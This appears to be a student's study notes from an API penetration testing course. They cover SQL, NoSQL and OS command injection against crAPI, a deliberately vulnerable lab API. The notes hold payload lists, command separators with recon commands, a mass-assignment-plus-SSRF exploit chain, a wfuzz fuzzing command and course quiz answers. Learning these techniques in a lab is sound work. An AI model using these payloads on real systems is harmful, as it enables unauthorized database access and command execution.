# Injection Attacks  

>[Testing for Injection Vulnerabilities](https://university.apisec.ai/products/api-penetration-testing/categories/2150251361/posts/2157505668)  

## Discovering Injection Vulnerabilities  

>Fuzzing APIs is the process of sending various types of input to an endpoint to provoke an unintended response.  
>The payloads used for fuzzing include symbols, numbers, system commands, SQL queries, NoSQL queries, emojis, hexadecimal, boolean statements.  

>When reviewing API documentation, if the API is expecting a certain type of input (number, string, boolean value) send:

* Very large number
* very large string
* negative number
* string (instead of a number or boolean value)
* Random characters
* Boolean values
* Meta characters  

## SQL Injection  

```
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1

0'; select version() --+
```  

>Last payload at endpoint `http://127.0.0.1:8888/workshop/api/shop/apply_coupon`, return the version of the crAPI SQL server:  

![crapi-sql-injection-test.png](/images/crapi-sql-injection-test.png)  

## NoSQL Injection  

>List of [noSQL payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection), and sample below:  

```
$gt 
{"$gt":""}
{"$gt":-1}

$ne
{"$ne": 1}
{"$ne":""}
{"$ne":-1}
{'$ne': 1}
{'$ne':''}
{'$ne':-1}

$nin
{"$nin":1}
{"$nin":[1]}

{"$where":  "sleep(1000)"}
```  

>`$gt` is a MongoDB NoSQL query operator that selects documents that are greater than the provided value.  
>The `$ne` query operator selects documents where the value is not equal to the provided value.  
>The `$nin` operator is the `not in` operator, used to select documents where the field value is not within the specified array.  
>Many of the others in the list contain symbols that are meant to cause verbose errors.  
>Other payload samples attempt to bypassing authentication or waiting 10 seconds.  

>Enumeration of JSON POST body fields provide an error message that indicate possible noSQL.  
>`422 Unprocessably entity code` The ” character in the payload closes the value field and the server doesn’t know what to do with the remaining characters.  


```JSON
{"error":"invalid character '$' after object key:value pair"}
```  

>At endpoint `http://127.0.0.1:8888/community/api/v2/coupon/validate-coupon` the burp interuder is used to fuzz for possible interesting payloads.  

![crapi-nosql-injection-fuzzing.png](/images/crapi-nosql-injection-fuzzing.png)

>Result of fuzzing show noSQL injection, returning a shop coupon at the `/community/api/v2/coupon/validate-coupon`.  

![crapi-nosql-injection-fuzzing-result.png](/images/crapi-nosql-injection-fuzzing-result.png)  

## OS Command Injection  

>Operating system command injection attacks inject a command separator and operating system commands.  

```
|
||
&
&&
'
"
;
'"
```  

>Common Operating System Commands:  

```
ipconfig
dir
ver
whoami
ifconfig
ls
pwd
id
```

>Enumeration of endpoint to change video name, show several fields in the response for video format and conversion.  
>Excessive data exposure is a security vulnerability that occurs when an API returns more information than is necessary.  
>This can lead to sensitive information being exposed to hackers.  

![crapi-os-cmd-injection-enumeration.png](/images/crapi-os-cmd-injection-enumeration.png)  

```JSON
{
"id":202,
"video_name":"My Video Name",
"conversion_params":"-v codec h264",
"profileVideo":"data:image/jpeg;base64,AAAAGGZ0eXBtcDQyAAAAA snip "
}
```  

>Altering the PUT endpoint to add new field to change value indicate mass assignment vulnerability:  

```JSON
{"videoName":"My Video Name","conversion_params":"-v codec MASS ASSIGNMENT VULNERABILITY"}
```  

>Targeting the JSON parameter `conversion_params` in `PUT /identity/api/v2/user/videos/202` to find correct OS CMD inject escape and excution.  

>Once parameter conversion_params update with OS CMD payload and we get video, a 403 Forbidden response message indicate internal server on port `8080`:  

```JSON
{
"message":"Thi-S endpoint S-hould be accessed only inte-Rnally.
endpoint_url http://crapi-identity:8080/identity/api/v2/user/videos/convert_video",
"status":403
}
```  

>Based on the leaked error message, we need to use the discovered SSRF vulnerability to trigger our payload.  
>Make a note of the internal URL from error message that is given to us.  

```
http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id=202
```  

![crapi-mass-assignment-with-ssrf-trigger-to-exploit-os-cmd-injection-attack.png](/images/crapi-mass-assignment-with-ssrf-trigger-to-exploit-os-cmd-injection-attack.png)  

```
WOW. Look at you. Combining Mass Assignment and SSRF to exploit a hidden Shell Injection.
We're very proud. You won the game. Unfortunately, we don't actually  
allow our pentester to run arbitrary shell commands on our backend :( 
It could be very expensive and annoying to maintain it. 
Anyhow, if you host your own instance of crAPI, you can simply change the
`block_shell_injections` flag in the config file to allow real shell injections.
```  

>Which of the following is not a type of injection attack?  

* Authorization Injection  

>Which tool is ideal for fuzzing across an entire API?  

* Postman Collection Runner  

>Which anomalous status code resulted in the discovery of an injection vulnerability in crAPI?  

* 422  

>Which of the following attacks was crAPI vulnerable to?  

* NoSQL Injection  

>Which of the following would not be useful for detecting a successful injection attack?  

* An HTTP 208 Already Reported response  

>Which of the following tools is ideal for fuzzing deep into an individual request?

* Burp Suite Intruder

----  

## Fuzzing WFuzz  

```
wfuzz -z file,usr/share/wordlists/nosqli  -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
```  

>***wfuzz --help***  

```                                                                        
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Usage:  wfuzz [options] -z payload,params <url>

        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.
        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering

Options:
        -h/--help                 : This help
        --help                    : Advanced help
        --filter-help             : Filter language specification
        --version                 : Wfuzz version details
        -e <type>                 : List of available encoders/payloads/iterators/printers/scripts

        --recipe <filename>       : Reads options from a recipe. Repeat for various recipes.
        --dump-recipe <filename>  : Prints current options as a recipe
        --oF <filename>           : Saves fuzz results to a file. These can be consumed later using the wfuzz payload.

        -c                        : Output with colors
        -v                        : Verbose information.
        -f filename,printer       : Store results in the output file using the specified printer (raw printer if omitted).
        -o printer                : Show results using the specified printer.
        --interact                : (beta) If selected,all key presses are captured. This allows you to interact with the program.
        --dry-run                 : Print the results of applying the requests without actually making any HTTP request.
        --prev                    : Print the previous HTTP requests (only when using payloads generating fuzzresults)
        --efield <expr>           : Show the specified language expression together with the current payload. Repeat for various fields.
        --field <expr>            : Do not show the payload but only the specified language expression. Repeat for various fields.

        -p addr                   : Use Proxy in format ip:port:type. Repeat option for using various proxies.
                                    Where type could be SOCKS4,SOCKS5 or HTTP if omitted.

        -t N                      : Specify the number of concurrent connections (10 default)
        -s N                      : Specify time delay between requests (0 default)
        -R depth                  : Recursive path discovery being depth the maximum recursion level.
        -D depth                  : Maximum link depth level.
        -L,--follow               : Follow HTTP redirections
        --ip host:port            : Specify an IP to connect to instead of the URL's host in the format ip:port
        -Z                        : Scan mode (Connection errors will be ignored).
        --req-delay N             : Sets the maximum time in seconds the request is allowed to take (CURLOPT_TIMEOUT). Default 90.
        --conn-delay N            : Sets the maximum time in seconds the connection phase to the server to take (CURLOPT_CONNECTTIMEOUT). Default 90.

        -A, --AA, --AAA           : Alias for -v -c and --script=default,verbose,discover respectively
        --no-cache                : Disable plugins cache. Every request will be scanned.
        --script=                 : Equivalent to --script=default
        --script=<plugins>        : Runs script's scan. <plugins> is a comma separated list of plugin-files or plugin-categories
        --script-help=<plugins>   : Show help about scripts.
        --script-args n1=v1,...   : Provide arguments to scripts. ie. --script-args grep.regex="<A href=\"(.*?)\">"

        -u url                    : Specify a URL for the request.
        -m iterator               : Specify an iterator for combining payloads (product by default)
        -z payload                : Specify a payload for each FUZZ keyword used in the form of name[,parameter][,encoder].
                                    A list of encoders can be used, ie. md5-sha1. Encoders can be chained, ie. md5@sha1.
                                    Encoders category can be used. ie. url
                                    Use help as a payload to show payload plugin's details (you can filter using --slice)
        --zP <params>             : Arguments for the specified payload (it must be preceded by -z or -w).
        --zD <default>            : Default parameter for the specified payload (it must be preceded by -z or -w).
        --zE <encoder>            : Encoder for the specified payload (it must be preceded by -z or -w).
        --slice <filter>          : Filter payload's elements using the specified expression. It must be preceded by -z.
        -w wordlist               : Specify a wordlist file (alias for -z file,wordlist).
        -V alltype                : All parameters bruteforcing (allvars and allpost). No need for FUZZ keyword.
        -X method                 : Specify an HTTP method for the request, ie. HEAD or FUZZ

        -b cookie                 : Specify a cookie for the requests. Repeat option for various cookies.
        -d postdata               : Use post data (ex: "id=FUZZ&catalogue=1")
        -H header                 : Use header (ex:"Cookie:id=1312321&user=FUZZ"). Repeat option for various headers.
        --basic/ntlm/digest auth  : in format "user:pass" or "FUZZ:FUZZ" or "domain\FUZ2Z:FUZZ"

        --hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
        --sc/sl/sw/sh N[,N]+      : Show responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
        --ss/hs regex             : Show/hide responses with the specified regex within the content
        --filter <filter>         : Show/hide responses using the specified filter expression (Use BBB for taking values from baseline)
        --prefilter <filter>      : Filter items before fuzzing using the specified expression. Repeat for concatenating filters.
```  

----  
